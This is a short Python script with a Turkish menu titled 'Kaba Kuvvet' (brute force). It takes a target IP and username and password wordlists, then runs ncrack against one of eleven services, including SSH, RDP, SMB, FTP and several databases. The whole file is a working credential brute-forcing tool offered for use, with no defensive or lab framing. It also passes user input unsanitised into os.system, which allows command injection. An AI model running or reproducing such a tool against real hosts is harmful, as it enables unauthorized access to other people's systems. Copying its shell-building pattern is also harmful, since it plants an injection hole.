#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os 

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Kaba Kuvvet")

print("""
-------------------------------------------------------------------
---------------Kaba Kuvvet Programına hoşgeldiniz.-----------------
-------------------------------------------------------------------
--------------------------1) FTP-----------------------------------
--------------------------2) SSH-----------------------------------
--------------------------3) Telnet--------------------------------
--------------------------4) HTTP----------------------------------
--------------------------5) SMB-----------------------------------
--------------------------6) RDP-----------------------------------
--------------------------7) VNC-----------------------------------
--------------------------8) SIP-----------------------------------
--------------------------9) Redis---------------------------------
--------------------------10) PostgreSQL---------------------------
--------------------------11)MySQL---------------------------------
-------------------------------------------------------------------
-------------------------------------------------------------------
-----------------------*Ferhat SARA*-------------------------------
-------------------------------------------------------------------
-------------------------------------------------------------------


""")

number=raw_input("İşlem No Girin:  ")
targetip=raw_input("Hedef İp Girin:  ")
user=raw_input("Kullanıcı Kelime Listesi Yolu Girin:  ")
password=raw_input("Şifre Kelime Listesi Yolu Girin:  ")

if(number=="1"):
	os.system("ncrack -p 21 -U "+user+" -P "+password+" "+targetip)
elif(number=="2"):
	os.system("ncrack -p 22 -U "+user+" -P "+password+" "+targetip)
elif(number=="3"):
	os.system("ncrack -p 23 -U "+user+" -P "+password+" "+targetip)
elif(number=="4"):
	os.system("ncrack -p 80 -U "+user+" -P "+password+" "+targetip)
elif(number=="5"):
	os.system("ncrack -p 445 -U "+user+" -P "+password+" "+targetip)
elif(number=="6"):
	os.system("ncrack -p 3389 -U "+user+" -P "+password+" "+targetip)
elif(number=="7"):
	os.system("ncrack -p 5900 -U "+user+" -P "+password+" "+targetip)
elif(number=="8"):
	os.system("ncrack -p 5060  -U "+user+" -P "+password+" "+targetip)
elif(number=="9"):
	os.system("ncrack -p 6379 -U "+user+" -P "+password+" "+targetip)
elif(number=="10"):
	os.system("ncrack -p 5432 -U "+user+" -P "+password+" "+targetip)
elif(number=="11"):
	os.system("ncrack -p 3306 -U "+user+" -P "+password+" "+targetip)

 